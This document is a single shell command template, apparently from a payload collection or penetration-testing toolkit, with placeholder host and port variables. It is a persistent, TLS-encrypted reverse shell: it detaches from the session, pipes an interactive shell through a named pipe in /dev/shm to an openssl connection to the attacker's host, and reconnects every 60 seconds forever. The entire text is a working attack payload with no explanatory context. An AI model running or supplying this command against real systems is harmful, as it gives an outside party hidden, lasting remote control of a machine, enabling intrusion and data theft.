setsid sh -c 'while :;do rm -f /dev/shm/s;mkfifo /dev/shm/s && sh -i </dev/shm/s 2>&1|openssl s_client -quiet -connect {{ LHOST }}:{{ LPORT }} >/dev/shm/s;rm -f /dev/shm/s;sleep 60;done'
